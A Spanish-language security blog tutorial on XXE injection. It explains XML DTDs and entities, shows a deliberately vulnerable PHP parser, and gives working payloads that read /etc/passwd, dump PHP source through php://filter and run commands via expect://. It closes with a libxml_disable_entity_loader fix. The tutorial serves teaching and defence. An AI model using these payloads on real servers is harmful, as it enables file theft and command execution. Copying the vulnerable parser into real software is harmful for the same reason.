@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>XXE Injection (I) - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="Las inyecciones XXE son una técnica de explotación que se centra en aprovechar el uso de&nbsp; entidades externas dentro de un documento XML ( &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/15/xxe-injection-i/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">XXE Injection (I)</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-15T14:51:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:51 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-G5S8Y4aMu0k/VLhCPOx36SI/AAAAAAAAAPw/b8HoZeRtp5w/s1600/xml.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-G5S8Y4aMu0k/VLhCPOx36SI/AAAAAAAAAPw/b8HoZeRtp5w/s1600/xml.jpg" height="200" width="400" /></a></div><br /><br />Las inyecciones <b>XXE</b> son una técnica de explotación que se centra en aprovechar el uso de&nbsp; entidades externas dentro de un documento XML (<span class="st">eXtensible Markup Language</span>). <br /><br />Para lograr comprender el&nbspsignificado&nbspde&nbspentidad&nbspy&nbspasi adentrarnos en este tutorial, se recomienda tener un conocimiento basico sobre la estructura del lenguaje, pueden pasarse por el siguiente <a href="http://www.mclibre.org/consultar/xml/">enlace</a> donde encontraran mucho material acerca de la sintaxis de XML.<br /><br /><br />Primero se van a tener en cuenta un par de conceptos que tocaremos dentro de este apartado.<br /><br /><ul><li><b>Que es un DTD?</b></li></ul><br />Un DTD y como sus siglas lo indican (Definicion del tipo de documento), se encarga de decirle a el <b>parser XML</b> (motor XML) como va a estar compuesto un fichero de este tipo.<br /><br />Cada vez que un xml es cargado, el que se ocupa de verificar si dicho fichero presenta una estructura correcta, entre otras cosas, es el parser XML y lo hace primero consultando el DTD.<br /><br />Los DTD pueden encontrarse dentro del documento.<br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [  ]>]]></script> <br />Todo lo que se encuentra dentro del tag <b>[]</b> es parte del DTD.<br /><br /><br />O externos al mismo.<br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal SYSTEM "fichero.dtd" [  ]>]]></script> <br />Dentro de un DTD podemos realizar varias declaraciones, durante este escrito solo nos ocuparemos de la creacion de entidades.<br /><br /><br /><ul><li><b>Declaracion de entidades</b></li></ul><br />Para continuar con la explicacion, programe un simple script en php que se va a encargar de procesar strings XML.<br /><br /><script class="brush: php" type="syntaxhighlighter"><![CDATA[ <?php  if(!empty($_GET['xml'])){      $xml=$_GET['xml'];      $out=simplexml_load_string($xml);      echo $out->salida;  }  ?>  ]]></script> <br />Una entidad es algo muy similar a una constante, se encarga de almacenar valores que no pueden ser modificados a diferencia de una variable. Se pueden definir dos tipos de entidades:<br /><br /><ul><li>Internas</li></ul><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <!ENTITY foo "Yo soy el valor de la entidad interna">]]></script> <br /><ul><li>Externas</li></ul><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <!ENTITY foo SYSTEM "fichero.txt">]]></script> Para ambas entidades, al momento de llamarlas, tenemos lo que son las <b>Entidades generales</b> que pueden usarse dentro del documento xml y las <b>Entidades parametro</b>, que solo pueden llamarse dentro del <b>DTD</b>.<br /><br />El analisis de esta ultima va a dejarse para mas adelante ya que por el momento no se requiere su uso.<br /><br />Tenemos el siguiente documento, en el que hacemos referencia a una <b>entidad interna</b><br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [ <!ENTITY foo "Yo soy el valor de la entidad interna">]> <secsignal>    <salida>&foo;</salida></secsignal>]]></script> Fijense la sintaxis de acceso a la entidad interna general (<b>&amp;foo;</b>). Esto imprimiria <b>"Yo soy el valor de la entidad interna" </b>dentro del elemento <b>&lt;salida&gt;</b><br /><b><br /></b>Urlencodeamos y enviamos.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-4GYEjalhz1E/VLg_MG9PZRI/AAAAAAAAAPU/51UNfGdSN48/s1600/1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-4GYEjalhz1E/VLg_MG9PZRI/AAAAAAAAAPU/51UNfGdSN48/s640/1.png" /></a></div><br /><br />Pero que pasa cuando hacemos uso de entidades externas? ahi esta el verdadero peligro ya que nos permiten <b>leer ficheros dentro del servidor, realizar ataques DOS, enumerar servicios internos en la red y hasta incluso ejecutar comandos en el sistema</b>.<br /><br /><b>SYSTEM</b> nos deja utilizar ciertos wrappers y protocolos como <b>file://, php://, http://, ftp://, expect://</b>, entre otros.<br /><br />Intentemos divisar el famoso archivo <b>/etc/passwd</b><br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [ <!ENTITY foo SYSTEM "file:///etc/passwd">]> <secsignal>    <salida>&foo;</salida></secsignal>]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-RPZ5cuTzT1U/VLg_hl4bLqI/AAAAAAAAAPc/4GzR7tyMqFU/s1600/2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-RPZ5cuTzT1U/VLg_hl4bLqI/AAAAAAAAAPc/4GzR7tyMqFU/s640/2.png" /></a></div><br /><b>Leer ficheros php</b><br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [  <!ENTITY foo SYSTEM "php://filter/convert.base64-encode/resource=/var/www/xxe/load.php">]> <secsignal>    <salida>&foo;</salida></secsignal>]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-o2E5jt0LcsA/VLg_sKi6KiI/AAAAAAAAAPk/weSK-P65Ttc/s1600/3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-o2E5jt0LcsA/VLg_sKi6KiI/AAAAAAAAAPk/weSK-P65Ttc/s640/3.png" /></a></div><br /><b>Ejecutar comandos</b> siempre y cuando este instalado <b>expect://</b> en php, lo cual lo veo como una opcion poco probabable de darse, pero es interesante saber que podria estar presente en algun que otro entorno.<br /><br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [  <!ENTITY foo SYSTEM "expect://uname">]> <secsignal>    <salida>&foo;</salida></secsignal>]]></script> <br />Este tipo de falensias puede aprovecharse en webs que pidan la subida, por ejemplo de CVS en formato XML e impriman su contenido.<br />Incluso hasta el propio <b>FB</b> recientemente sufrio el impacto de esta tecnica, a diferencia de que los datos no eran procesados a la vista, lo cual deja como incognita la explotacion de <b>XXE a ciegas</b> para el proximo post.<br /><br />Me olvidaba, para evitar el uso de entidades externas cuando procesemos nuestros ficheros solo basta con utilizar la funcion<b> libxml_disable_entity_loader()</b> del siguiente modo.<br /><br /><script class="brush: php" type="syntaxhighlighter"><![CDATA[ <?php libxml_disable_entity_loader(true);  if(!empty($_GET['xml'])){     $xml=$_GET['xml'];     $out=simplexml_load_string($xml);     echo $out->salida;  } ?>]]></script> Saludos!</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-15T14:51:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:51 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/15/xxe-injection-i/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/15/xxe-injection-i/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/14/escribiendo-un-auxiliar-para-msf/" title="Previous Post: Escribiendo Un Auxiliar Para MSF">&laquo; Escribiendo Un Auxiliar Para MSF</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/16/desbordando-el-buffer-win-x86/" title="Next Post: Desbordando el Buffer Win x86">Desbordando el Buffer Win x86 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
